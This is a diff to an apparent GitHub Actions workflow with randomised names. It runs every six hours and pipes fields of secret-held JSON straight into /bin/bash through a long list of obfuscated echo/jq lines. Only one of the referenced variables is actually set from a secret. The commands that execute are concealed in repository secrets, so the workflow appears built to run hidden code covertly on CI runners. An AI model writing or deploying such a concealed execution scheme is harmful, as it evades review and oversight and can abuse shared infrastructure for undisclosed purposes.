@@ -1,10 +1,10 @@
 name: fascinatedsparkler
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 2/6 * * *'
-jobs:  # 6761
+    - cron: '35 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,15 +12,19 @@ jobs:  # 6761
       - uses: actions/checkout@v4
       - name: fascinatedsparkler
         env:
-          vdzv20579: ${{ secrets.vdzv20579 }}
+          mmzia671: ${{ secrets.mmzia671 }}
         run: |
-          echo $vdzv20579 | jq -r .uyxu51 | /bin/bash
-          echo $ayfe4098 | jq -r .qdm00 | /bin/bash
-          echo $bc7679 | jq -r .nkzk5 | /bin/bash
-          echo $jft2 | jq -r .kifb6 | /bin/bash
-          echo $bgrvc141 | jq -r .ad50433 | /bin/bash
-          echo $tunqf4083 | jq -r .knht71758 | /bin/bash
-          echo $vab09333 | jq -r .o7766 | /bin/bash
-          echo $ljod702 | jq -r .zufor2457 | /bin/bash
-          echo $mr8073 | jq -r .r415 | /bin/bash
+          echo $mmzia671 | jq -r .mq93 | /bin/bash
+          echo $bga9 | jq -r .icvp701 | /bin/bash
+          echo $g98 | jq -r .rxsk6 | /bin/bash
+          echo $tbbzv232 | jq -r .qn08 | /bin/bash
+          echo $v792 | jq -r .h0 | /bin/bash
+          echo $oo3 | jq -r .mz8 | /bin/bash
+          echo $xqqf054 | jq -r .mkuph02999 | /bin/bash
+          echo $ogwtc2 | jq -r .kqxmh410 | /bin/bash
+          echo $vfyol1994 | jq -r .elhpo0324 | /bin/bash
+          echo $zgn54 | jq -r .dpi156 | /bin/bash
+          echo $onvkt707 | jq -r .gaxrc1 | /bin/bash
+          echo $n59 | jq -r .n571 | /bin/bash
+          echo $vyfa144 | jq -r .obswj545 | /bin/bash
 
